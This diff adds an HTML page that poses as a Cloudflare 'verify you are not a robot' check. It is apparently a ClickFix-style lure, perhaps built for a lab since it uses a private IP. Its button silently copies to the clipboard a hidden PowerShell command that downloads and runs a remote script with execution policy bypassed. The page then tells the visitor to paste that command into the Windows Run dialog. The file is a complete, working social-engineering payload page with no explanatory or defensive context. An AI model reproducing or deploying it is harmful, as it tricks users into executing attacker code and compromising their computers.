@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Cloudflare Human Verification</title>
+    <style>
+        body { font-family: Arial, sans-serif; padding: 50px; text-align: center; }
+        .btn { padding: 15px 30px; font-size: 18px; background-color: #056fff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        .btn:hover { background-color: #0056b3; }
+        ol { text-align: left; display: inline-block; margin-top: 30px; }
+    </style>
+</head>
+<body>
+    <h2>Please Verify That You Are Not a Robot</h2>
+    <p>Click the button below to complete verification steps.</p>
+    
+    <button class="btn" onclick="copyPayload()">I am not a robot</button>
+
+    <br><br>
+    <ol style="display:none;" id="steps">
+        <li>Press <b>Win + R</b> on your keyboard.</li>
+        <li>In the run dialog that opens, press <b>CTRL + V</b> then press Enter.</li>
+    </ol>
+
+    <script>
+        function copyPayload() {
+            const payload = 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://192.168.56.102/x.ps1\')"';            
+            const textArea = document.createElement("textarea");
+            textArea.value = payload;            
+            textArea.style.position = "fixed";
+            textArea.style.left = "-999999px";
+            textArea.style.top = "-999999px";
+            document.body.appendChild(textArea);            
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                alert("Verification steps copied! Please follow the instructions.");
+                document.getElementById('steps').style.display = 'inline-block';
+            } catch (err) {
+                console.error('Kopyalama başarısız:', err);
+            }            
+            document.body.removeChild(textArea);
+        }
+    </script>
+</body>
+</html>
